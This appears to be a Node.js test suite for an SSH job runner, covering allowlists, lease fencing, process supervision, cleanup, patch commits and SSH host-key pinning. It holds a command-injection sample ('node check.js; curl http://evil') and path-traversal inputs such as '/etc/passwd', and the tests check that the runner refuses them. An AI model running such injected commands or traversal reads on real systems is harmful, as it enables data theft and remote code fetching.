import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { ApplicationStateStore, type JsonValue } from "../../apps/server/src/state/application-state.js";
import { ExternalOperationJournal } from "../../apps/server/src/workflow/external-operation-journal.js";
import { RunnerAdapter } from "../../apps/server/src/adapters/ssh-runner/runner-adapter.js";
import { LocalRunnerTransport, SshRunnerTransport } from "../../apps/server/src/adapters/ssh-runner/runner-transport.js";

const RUNNER_ENTRY = join(process.cwd(), "dist/runner/main.js");

type Fixture = {
  root: string;
  source: string;
  transport: LocalRunnerTransport;
  call: (payload: Record<string, unknown>) => Promise<Record<string, unknown>>;
  cleanup: () => void;
};

function git(args: string[], cwd?: string): void {
  const result = spawnSync("git", cwd === undefined ? args : ["-C", cwd, ...args], { encoding: "utf8" });
  if (result.status !== 0) throw new Error(`git ${args.join(" ")} failed: ${result.stderr}`);
}

/** A real git repository with passing and failing check scripts, committed as the job source. */
function makeSourceRepo(directory: string): string {
  const source = join(directory, "source");
  mkdirSync(source);
  git(["init", "-q", "-b", "main", source]);
  writeFileSync(join(source, "check.js"), "console.log('check ok');\n");
  writeFileSync(join(source, "slow.js"), "setTimeout(() => console.log('slow done'), 4000);\n");
  writeFileSync(join(source, "fail.js"), "console.error('check failed'); process.exit(3);\n");
  git(["add", "-A"], source);
  git(["-c", "user.email=slice@example.invalid", "-c", "user.name=Slice Test", "commit", "-q", "-m", "demo baseline"], source);
  return source;
}

function newFixture(allowedSources: string[]): Fixture {
  const directory = mkdtempSync(join(tmpdir(), "slice-runner-"));
  const root = join(directory, "runner-root");
  mkdirSync(root, { mode: 0o700 });
  writeFileSync(join(root, ".runner.json"), JSON.stringify({ allowedSources }));
  const source = makeSourceRepo(directory);
  const transport = new LocalRunnerTransport(RUNNER_ENTRY, root);
  return {
    root,
    source,
    transport,
    call: async (payload) => await transport.request(payload as JsonValue) as Record<string, unknown>,
    cleanup: () => rmSync(directory, { recursive: true, force: true }),
  };
}

async function waitUntil(check: () => Promise<boolean>, timeoutMs = 20_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await check()) return;
    await new Promise((resolveTick) => setTimeout(resolveTick, 200));
  }
  throw new Error("condition never became true");
}

test("prepare_job clones the registered source, creates the worktree and branch, and reuses on retry", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    const prepared = await f.call({ op: "prepare_job", jobId: "job-1", source: f.source, branch: "slice/job-1/add-screen", leaseGeneration: 1 });
    assert.equal(prepared.ok, true);
    assert.match(String(prepared.baseCommit), /^[0-9a-f]{7,40}$/);
    assert.ok(existsSync(join(f.root, "job-1", "author", "check.js")), "the author worktree holds the base commit");
    const branches = spawnSync("git", ["-C", join(f.root, "job-1", "repo"), "branch", "--list"], { encoding: "utf8" }).stdout;
    assert.ok(branches.includes("slice/job-1/add-screen"));

    const retry = await f.call({ op: "prepare_job", jobId: "job-1", source: f.source, branch: "slice/job-1/add-screen", leaseGeneration: 1 });
    assert.equal(retry.ok, true);
    assert.equal(retry.reused, true, "the job marker makes preparation idempotent");

    const clash = await f.call({ op: "prepare_job", jobId: "job-1", source: f.source, branch: "slice/job-1/different", leaseGeneration: 1 });
    assert.equal(clash.ok, false);
    assert.equal(clash.error, "job_marker_mismatch");
  } finally { f.cleanup(); }
});

test("the runner only accepts sources on its allowlist", async () => {
  const f = newFixture([]);
  try {
    const refused = await f.call({ op: "prepare_job", jobId: "job-2", source: f.source, branch: "slice/job-2/x", leaseGeneration: 1 });
    assert.equal(refused.ok, false);
    assert.equal(refused.error, "source_not_allowed");
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    const allowed = await f.call({ op: "prepare_job", jobId: "job-2", source: f.source, branch: "slice/job-2/x", leaseGeneration: 1 });
    assert.equal(allowed.ok, true);
  } finally { f.cleanup(); }
});

test("leases are fenced: an old generation is refused and a replacement waits for reconciliation", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-3", source: f.source, branch: "slice/job-3/x", leaseGeneration: 2 });
    const stale = await f.call({ op: "run_check", jobId: "job-3", operationId: "job-3:check:old", leaseGeneration: 1, checkId: "old", command: "node check.js" });
    assert.equal(stale.ok, false);
    assert.equal(stale.error, "lease_revoked");

    // A long-running check holds the current generation until it is reconciled.
    const started = await f.call({ op: "run_check", jobId: "job-3", operationId: "job-3:check:slow", leaseGeneration: 2, checkId: "slow", command: "node slow.js" });
    assert.equal(started.ok, true);
    const replacement = await f.call({ op: "prepare_job", jobId: "job-3", source: f.source, branch: "slice/job-3/x", leaseGeneration: 3 });
    assert.equal(replacement.ok, false);
    assert.equal(replacement.error, "reconcile_required");

    await waitUntil(async () => {
      const status = await f.call({ op: "get_process_status", jobId: "job-3", operationId: "job-3:check:slow" });
      return status.status !== "running";
    });
    const afterReconcile = await f.call({ op: "prepare_job", jobId: "job-3", source: f.source, branch: "slice/job-3/x", leaseGeneration: 3 });
    assert.equal(afterReconcile.ok, true, "a replacement lease is granted once the work is settled");
  } finally { f.cleanup(); }
});

test("checks run supervised: exit codes are recorded and output is captured", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-4", source: f.source, branch: "slice/job-4/x", leaseGeneration: 1 });
    const pass = await f.call({ op: "run_check", jobId: "job-4", operationId: "job-4:check:pass", leaseGeneration: 1, checkId: "pass", command: "node check.js" });
    assert.equal(pass.ok, true);
    await waitUntil(async () => {
      const status = await f.call({ op: "get_process_status", jobId: "job-4", operationId: "job-4:check:pass" });
      if (status.status !== "succeeded") return false;
      assert.equal(status.exitCode, 0);
      assert.ok(String(status.outputTail).includes("check ok"));
      return true;
    });

    await f.call({ op: "run_check", jobId: "job-4", operationId: "job-4:check:fail", leaseGeneration: 1, checkId: "fail", command: "node fail.js" });
    await waitUntil(async () => {
      const status = await f.call({ op: "get_process_status", jobId: "job-4", operationId: "job-4:check:fail" });
      if (status.status !== "failed") return false;
      assert.equal(status.exitCode, 3);
      return true;
    });

    const shellish = await f.call({ op: "run_check", jobId: "job-4", operationId: "job-4:check:evil", leaseGeneration: 1, checkId: "evil", command: "node check.js; curl http://evil" });
    assert.equal(shellish.ok, false);
    assert.equal(shellish.error, "command_not_allowed");
  } finally { f.cleanup(); }
});

test("a missing PID record is uncertainty, never permission to start a duplicate", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-5", source: f.source, branch: "slice/job-5/x", leaseGeneration: 1 });
    await f.call({ op: "run_check", jobId: "job-5", operationId: "job-5:check:slow", leaseGeneration: 1, checkId: "slow", command: "node slow.js" });
    // Let the supervisor publish itself first, then simulate the crash window: the process ran
    // but its PID record is gone.
    await waitUntil(async () => (await f.call({ op: "get_process_status", jobId: "job-5", operationId: "job-5:check:slow" })).status === "running");
    rmSync(join(f.root, ".journal", "pids", "job-5:check:slow"), { force: true });
    // Reconcile first: the runner reports the outcome as uncertain and records it, without ever
    // treating the missing record as permission to run the check again.
    const reconcile = await f.call({ op: "reconcile", jobId: "job-5" });
    assert.deepEqual((reconcile.operations as { status: string }[]).map((row) => row.status), ["uncertain"]);
    const status = await f.call({ op: "get_process_status", jobId: "job-5", operationId: "job-5:check:slow" });
    assert.equal(status.status, "uncertain");
  } finally { f.cleanup(); }
});

test("cancel signals the whole supervised process group", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-6", source: f.source, branch: "slice/job-6/x", leaseGeneration: 1 });
    await f.call({ op: "run_check", jobId: "job-6", operationId: "job-6:check:slow", leaseGeneration: 1, checkId: "slow", command: "node slow.js" });
    const cancelled = await f.call({ op: "cancel_process", jobId: "job-6", operationId: "job-6:check:slow" });
    assert.equal(cancelled.ok, true);
    assert.equal(cancelled.status, "cancel_signalled");
    await waitUntil(async () => {
      const status = await f.call({ op: "get_process_status", jobId: "job-6", operationId: "job-6:check:slow" });
      // A SIGTERM-killed supervisor records a signal exit, never a silent success.
      return status.status === "failed" || status.status === "uncertain";
    });
    const final = await f.call({ op: "get_process_status", jobId: "job-6", operationId: "job-6:check:slow" });
    if (final.status === "failed") assert.equal(final.exitCode, 128);
  } finally { f.cleanup(); }
});

test("cleanup refuses paths that do not match the manifest and removes only the job's own tree", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-7", source: f.source, branch: "slice/job-7/x", leaseGeneration: 1 });
    // A stray directory under the root with no job manifest is refused, not deleted.
    mkdirSync(join(f.root, "someone-elses-work"), { recursive: true });
    const refused = await f.call({ op: "cleanup_job", jobId: "someone-elses-work" });
    assert.equal(refused.ok, false);
    assert.equal(refused.error, "manifest_mismatch");
    assert.ok(existsSync(join(f.root, "someone-elses-work")));

    const removed = await f.call({ op: "cleanup_job", jobId: "job-7" });
    assert.equal(removed.ok, true);
    assert.equal(existsSync(join(f.root, "job-7")), false);
    assert.ok(existsSync(f.source), "the source repository is never touched");
  } finally { f.cleanup(); }
});

test("cleanup refuses while an operation is uncertain, even on a later attempt", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-9", source: f.source, branch: "slice/job-9/x", leaseGeneration: 1 });
    await f.call({ op: "run_check", jobId: "job-9", operationId: "job-9:check:slow", leaseGeneration: 1, checkId: "slow", command: "node slow.js" });
    await waitUntil(async () => (await f.call({ op: "get_process_status", jobId: "job-9", operationId: "job-9:check:slow" })).status === "running");
    rmSync(join(f.root, ".journal", "pids", "job-9:check:slow"), { force: true });
    await f.call({ op: "reconcile", jobId: "job-9" });
    const refused = await f.call({ op: "cleanup_job", jobId: "job-9" });
    assert.equal(refused.ok, false);
    assert.equal(refused.error, "processes_not_confirmed_stopped");
    const stillRefused = await f.call({ op: "cleanup_job", jobId: "job-9" });
    assert.equal(stillRefused.ok, false, "uncertainty keeps cleanup pending until reconciliation resolves it");
    // Once the check finishes, its exit file settles the uncertainty and cleanup is allowed.
    await waitUntil(async () => (await f.call({ op: "cleanup_job", jobId: "job-9" })).ok === true, 8_000);
  } finally { f.cleanup(); }
});

test("the journal reattaches a completed remote check instead of running it twice", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    const directory = mkdtempSync(join(tmpdir(), "slice-runner-journal-"));
    const state = ApplicationStateStore.open(join(directory, "state.sqlite"));
    const journal = new ExternalOperationJournal(state.database);
    let dispatches = 0;
    const counting = {
      request: async (payload: unknown) => {
        const record = payload as Record<string, unknown>;
        if (record.op === "run_check") dispatches += 1;
        return await f.transport.request(payload as never);
      },
    };
    const adapter = new RunnerAdapter(journal, () => counting, { pollIntervalMs: 100 });
    await adapter.prepareJob({ jobId: "job-8", hostId: "runner-a", source: f.source, branch: "slice/job-8/x", leaseGeneration: 1 });
    const first = await adapter.runCheck({ jobId: "job-8", hostId: "runner-a", leaseGeneration: 1, checkId: "pass", command: "node check.js" });
    assert.equal(first.status, "succeeded");
    // A second call with the same operation ID replays the recorded result without a new dispatch.
    const second = await adapter.runCheck({ jobId: "job-8", hostId: "runner-a", leaseGeneration: 1, checkId: "pass", command: "node check.js" });
    assert.equal(second.status, "succeeded");
    assert.equal(dispatches, 1);
    state.close();
    rmSync(directory, { recursive: true, force: true });
  } finally { f.cleanup(); }
});

test("the SSH transport refuses to run without a host key pin and builds a fixed argv", async () => {
  const directory = mkdtempSync(join(tmpdir(), "slice-ssh-transport-"));
  try {
    const transport = new SshRunnerTransport({
      address: "runner.internal",
      sshUser: "slice-runner",
      runnerRoot: "/srv/slice/jobs",
      remoteEntryPath: "/usr/local/slice/runner/main.js",
      knownHostsFile: join(directory, "known_hosts"),
    });
    await assert.rejects(transport.request({ op: "health" }), /host key pin missing/);

    // With the pin present, a fake ssh shows the exact fixed argv the transport produces.
    writeFileSync(join(directory, "known_hosts"), "runner.internal ssh-ed25519 AAAAtest\n");
    const argvFile = join(directory, "argv.json");
    const fakeSsh = join(directory, "fake-ssh.mjs");
    writeFileSync(fakeSsh, [
      "#!/usr/bin/env node",
      "import { writeFileSync } from 'node:fs';",
      `writeFileSync(${JSON.stringify(argvFile)}, JSON.stringify(process.argv.slice(2)));`,
      "process.stdout.write(JSON.stringify({ ok: true, runnerId: 'fake' }) + '\\n');",
    ].join("\n"), { mode: 0o755 });
    const recording = new SshRunnerTransport({
      address: "runner.internal",
      sshUser: "slice-runner",
      runnerRoot: "/srv/slice/jobs",
      remoteEntryPath: "/usr/local/slice/runner/main.js",
      knownHostsFile: join(directory, "known_hosts"),
      identityFilePath: join(directory, "id_ed25519"),
      sshCommand: fakeSsh,
    });
    const response = await recording.request({ op: "health" });
    assert.equal(response.ok, true);
    const argv = JSON.parse(readFileSync(argvFile, "utf8")) as string[];
    for (const required of ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=yes", "-o", "UpdateHostKeys=no", "-o", "UserKnownHostsFile=" + join(directory, "known_hosts"), "-i", join(directory, "id_ed25519"), "slice-runner@runner.internal", "node", "/usr/local/slice/runner/main.js", "--root", "/srv/slice/jobs"]) {
      assert.ok(argv.includes(required), `argv must contain ${required}`);
    }
    assert.ok(!argv.some((arg) => String(arg).includes("op")), "the request payload never becomes shell text");

    // A changed host key makes real ssh exit 255; the transport surfaces the failure, it never retries through it.
    writeFileSync(fakeSsh, [
      "#!/usr/bin/env node",
      "process.stderr.write('@@@@\tREMOTE HOST IDENTIFICATION HAS CHANGED @@@@');",
      "process.exit(255);",
    ].join("\n"), { mode: 0o755 });
    await assert.rejects(recording.request({ op: "health" }), /REMOTE HOST IDENTIFICATION HAS CHANGED|ssh runner request failed/);
  } finally { rmSync(directory, { recursive: true, force: true }); }
});

// ------------------------------------------------------------- Phase 2 ops

const NEW_FILE_PATCH = [
  "diff --git a/added.md b/added.md",
  "new file mode 100644",
  "--- /dev/null",
  "+++ b/added.md",
  "@@ -0,0 +1 @@",
  "+office note",
].join("\n");

test("apply_change commits a validated patch and stamps the commit with its operation marker", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    const prepared = await f.call({ op: "prepare_job", jobId: "job-10", source: f.source, branch: "slice/job-10/x", leaseGeneration: 1 });
    const base = String(prepared.baseCommit);
    const applied = await f.call({ op: "apply_change", jobId: "job-10", operationId: "job-10:commit:r1", leaseGeneration: 1, patch: NEW_FILE_PATCH, commitMessage: "add a note", expectedParent: base });
    assert.equal(applied.ok, true);
    assert.match(String(applied.commit), /^[0-9a-f]{40}$/);
    const message = spawnSync("git", ["-C", join(f.root, "job-10", "author"), "log", "-1", "--format=%B"], { encoding: "utf8" }).stdout;
    assert.ok(message.includes("slice-op:job-10:commit:r1"), "the marker makes an interrupted apply reconcilable");

    const head = await f.call({ op: "verify_head", jobId: "job-10" });
    assert.equal(head.ok, true);
    assert.equal(head.head, applied.commit);
    assert.equal(head.clean, true, "the commit left no uncommitted changes");

    // A replay against a stale parent fails loudly instead of stacking commits.
    const stale = await f.call({ op: "apply_change", jobId: "job-10", operationId: "job-10:commit:r2", leaseGeneration: 1, patch: NEW_FILE_PATCH, commitMessage: "again", expectedParent: base });
    assert.equal(stale.ok, false);
    assert.equal(stale.error, "parent_mismatch");

    // A patch git refuses is a recorded failure.
    const bad = await f.call({ op: "apply_change", jobId: "job-10", operationId: "job-10:commit:r3", leaseGeneration: 1, patch: "not a diff at all", commitMessage: "bad", expectedParent: String(applied.commit) });
    assert.equal(bad.ok, false);
    assert.match(String(bad.error), /patch_rejected/);
  } finally { f.cleanup(); }
});

test("reconcile settles an interrupted apply by the marker commit, and a failed apply may be retried", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    const prepared = await f.call({ op: "prepare_job", jobId: "job-11", source: f.source, branch: "slice/job-11/x", leaseGeneration: 1 });
    const journalDb = new DatabaseSync(join(f.root, ".journal", "journal.sqlite"));
    // Simulate a runner that died between the apply and the status record.
    journalDb.prepare("INSERT INTO operations (operation_id, job_id, lease_generation, op, status, exit_code, started_at, updated_at) VALUES ('job-11:commit:r1', 'job-11', 1, 'apply_change', 'running', NULL, ?, ?)").run(Date.now(), Date.now());
    journalDb.close();
    const reconciled = await f.call({ op: "reconcile", jobId: "job-11" });
    assert.equal(reconciled.ok, true);
    const rows = reconciled.operations as { operationId: string; status: string }[];
    assert.deepEqual(rows.find((row) => row.operationId === "job-11:commit:r1")?.status, "failed", "no marker commit means the attempt failed");

    // The same operation ID may now be re-planned, because its failure is recorded.
    const retried = await f.call({ op: "apply_change", jobId: "job-11", operationId: "job-11:commit:r1", leaseGeneration: 1, patch: NEW_FILE_PATCH, commitMessage: "retry", expectedParent: String(prepared.baseCommit) });
    assert.equal(retried.ok, true);
  } finally { f.cleanup(); }
});

test("read_source stays inside the worktree and export_commit only carries the branch head", async () => {
  const f = newFixture([]);
  try {
    writeFileSync(join(f.root, ".runner.json"), JSON.stringify({ allowedSources: [f.source] }));
    await f.call({ op: "prepare_job", jobId: "job-12", source: f.source, branch: "slice/job-12/x", leaseGeneration: 1 });
    const ok = await f.call({ op: "read_source", jobId: "job-12", path: "check.js" });
    assert.equal(ok.ok, true);
    assert.ok(String(ok.content).includes("check ok"));
    for (const path of ["../escape", "/etc/passwd", "..", "subdir/../../x"]) {
      const refused = await f.call({ op: "read_source", jobId: "job-12", path });
      assert.equal(refused.ok, false, `${path} must not be readable`);
    }
    const head = await f.call({ op: "verify_head", jobId: "job-12" });
    const wrong = await f.call({ op: "export_commit", jobId: "job-12", commit: "0123456789abcdef0123456789abcdef01234567" });
    assert.equal(wrong.ok, false, "a bundle is only exported for the actual branch head");
    const bundle = await f.call({ op: "export_commit", jobId: "job-12", commit: String(head.head) });
    assert.equal(bundle.ok, true);
    assert.ok(Buffer.from(String(bundle.bundleBase64), "base64").length > 100);
  } finally { f.cleanup(); }
});
